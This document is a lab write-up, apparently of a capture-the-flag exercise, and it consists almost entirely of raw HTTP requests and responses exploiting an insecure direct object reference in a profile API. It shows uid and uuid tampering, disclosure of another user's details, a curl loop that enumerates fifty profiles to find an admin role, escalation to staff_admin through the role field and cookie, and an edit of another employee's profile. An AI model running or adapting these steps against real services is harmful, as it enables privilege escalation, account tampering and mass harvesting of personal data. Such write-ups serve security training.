# IDOR

## Insecure Function Calls

### Identification

```http title="Request" hl_lines="1 16-23"
PUT /profile/api.php/profile/1 HTTP/1.1
Host: 94.237.51.163:54556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.163:54556/profile/index.php
Content-type: application/json
Content-Length: 208
Origin: http://94.237.51.163:54556
Sec-GPC: 1
Connection: keep-alive
Cookie: role=employee
Priority: u=0

{
    "uid":1,
    "uuid":"40f5888b67c748df7efba008e7c2f9d2",
    "role":"employee",
    "full_name":"Amy Lindon",
    "email":"a_lindon@employees.htb",
    "about":"A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

### Testing

#### Changing UID

```http title="Request" hl_lines="17"
PUT /profile/api.php/profile/1 HTTP/1.1
Host: 94.237.51.163:54556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.163:54556/profile/index.php
Content-type: application/json
Content-Length: 208
Origin: http://94.237.51.163:54556
Sec-GPC: 1
Connection: keep-alive
Cookie: role=employee
Priority: u=0

{
    "uid":2,
    "uuid":"40f5888b67c748df7efba008e7c2f9d2",
    "role":"employee",
    "full_name":"Amy Lindon",
    "email":"a_lindon@employees.htb",
    "about":"A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

#### Changing UID (Response)

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 20:29:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 12
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

uid mismatch
```

#### Changing API Endpoint

```http title="Request" hl_lines="1 17"
PUT /profile/api.php/profile/2 HTTP/1.1
Host: 94.237.51.163:54556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.163:54556/profile/index.php
Content-type: application/json
Content-Length: 208
Origin: http://94.237.51.163:54556
Sec-GPC: 1
Connection: keep-alive
Cookie: role=employee
Priority: u=0

{
    "uid":2,
    "uuid":"40f5888b67c748df7efba008e7c2f9d2",
    "role":"employee",
    "full_name":"Amy Lindon",
    "email":"a_lindon@employees.htb",
    "about":"A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

#### Changing API Endpoint (Response)

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 20:31:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 13
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

uuid mismatch
```

#### Changing Request Method

```http title="Request" hl_lines="1 17"
POST /profile/api.php/profile/50 HTTP/1.1
Host: 94.237.51.163:54556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.163:54556/profile/index.php
Content-type: application/json
Content-Length: 208
Origin: http://94.237.51.163:54556
Sec-GPC: 1
Connection: keep-alive
Cookie: role=employee
Priority: u=0

{
    "uid":50,
    "uuid":"40f5888b67c748df7efba008e7c2f9d2",
    "role":"employee",
    "full_name":"Amy Lindon",
    "email":"a_lindon@employees.htb",
    "about":"A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

#### Changing Request Method (Response)

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 20:34:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 41
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Creating new employees is for admins only
```

#### Changing Current Role

```http title="Request" hl_lines="1 17 19"
PUT /profile/api.php/profile/1 HTTP/1.1
Host: 94.237.51.163:54556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.163:54556/profile/index.php
Content-type: application/json
Content-Length: 208
Origin: http://94.237.51.163:54556
Sec-GPC: 1
Connection: keep-alive
Cookie: role=employee
Priority: u=0

{
    "uid":1,
    "uuid":"40f5888b67c748df7efba008e7c2f9d2",
    "role":"admin",
    "full_name":"Amy Lindon",
    "email":"a_lindon@employees.htb",
    "about":"A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

#### Changing Current Role (Response)

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 20:35:35 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 12
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Invalid role
```

## Information Disclosure

### Details of Another User

```http title="Request" hl_lines="1"
GET /profile/api.php/profile/2 HTTP/1.1
Host: 94.237.51.163:54556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-GPC: 1
Connection: keep-alive
Cookie: role=employee
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

### Details of Another User (Response)

```http title="Response" hl_lines="10-17"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 20:42:03 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 230
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{
    "uid":"2",
    "uuid":"4a9bd19b3b8676199592a346051f950c",
    "role":"employee",
    "full_name":"Iona Franklyn",
    "email":"i_franklyn@employees.htb",
    "about":"It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

## Information Disclosure + Insecure Function Calls

### Mass Enumeration

```sh
my@attack:~$ for i in {1..50}; do curl -s "http://94.237.51.163:54556/profile/api.php/profile/$i" | grep role; done
```

```output title="Output" hl_lines="10"
{"uid":"1","uuid":"40f5888b67c748df7efba008e7c2f9d2","role":"employee","full_name":"Amy Lindon","email":"a_lindon@employees.htb","about":"A Release is like a boat. 80% of the holes plugged is not good enough."}
{"uid":"2","uuid":"4a9bd19b3b8676199592a346051f950c","role":"employee","full_name":"Iona Franklyn","email":"i_franklyn@employees.htb","about":"It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."}
{"uid":"3","uuid":"771409a8fb1543788fe7d91f1ea0987f","role":"employee","full_name":"Ardith Bloxham","email":"a_bloxham@employees.htb","about":"A fool with a tool is still a fool. Always have a goal, a plan & the tool as the enabler."}
{"uid":"4","uuid":"1a1f289428bd7ab3beb8a89d4c90b22f","role":"employee","full_name":"Lela Symons","email":"l_symons@employees.htb","about":"When working for IT Security, you are only one Incident away from being the most important group in IT."}
{"uid":"5","uuid":"eb4fe264c10eb7a528b047aa983a4829","role":"employee","full_name":"Callahan Woodhams","email":"c_woodhams@employees.htb","about":"I don't like quoting others!"}
{"uid":"6","uuid":"cb67c3ae286e9140355eb56d2c33ff5b","role":"employee","full_name":"Roscoe Alden","email":"r_alden@employees.htb","about":"Security is always excessive until it's not enough."}
{"uid":"7","uuid":"63d9b90d9808e4ddc24c2331ddd6775d","role":"employee","full_name":"Marsha Pierce","email":"m_pierce@employees.htb","about":"Security used to be an inconvenience sometimes, but now it's a necessity all the time."}
{"uid":"8","uuid":"deb77b7fcd6ee6af0b2c992355eaeea9","role":"employee","full_name":"George Fleming","email":"g_fleming@employees.htb","about":"IT Security is a form of Problem Management. It looks to proactively prevent Incidents."}
{"uid":"9","uuid":"ca7724498403de38829ae36fc9149b75","role":"employee","full_name":"Augusta Edwardson","email":"a_edwardson@employees.htb","about":"Simplicity is the ultimate sophistication."}
{"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"admin@employees.htb","about":"Never gonna give you up, Never gonna let you down"}
```

### Elevating Current Role

```http title="Request" hl_lines="1 17 19"
PUT /profile/api.php/profile/1 HTTP/1.1
Host: 94.237.51.163:54556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.163:54556/profile/index.php
Content-type: application/json
Content-Length: 208
Origin: http://94.237.51.163:54556
Sec-GPC: 1
Connection: keep-alive
Cookie: role=employee
Priority: u=0

{
    "uid":1,
    "uuid":"40f5888b67c748df7efba008e7c2f9d2",
    "role":"staff_admin",
    "full_name":"Amy Lindon",
    "email":"a_lindon@employees.htb",
    "about":"A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

### Elevating Current Role (Response)

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 20:57:15 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 1
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

1
```

### Exploitation

```http title="Request" hl_lines="1 13 22"
PUT /profile/api.php/profile/8 HTTP/1.1
Host: 94.237.51.163:54556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.163:54556/profile/index.php
Content-type: application/json
Content-Length: 148
Origin: http://94.237.51.163:54556
Sec-GPC: 1
Connection: keep-alive
Cookie: role=staff_admin
Priority: u=0

{
    "uid":8,
    "uuid":"deb77b7fcd6ee6af0b2c992355eaeea9",
    "role":"employee",
    "full_name":"George Fleming",
    "email":"g_fleming@employees.htb",
    "about":"PWNED"
}
```

### Exploitation (Response)

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 21:06:09 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 1
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

1
```
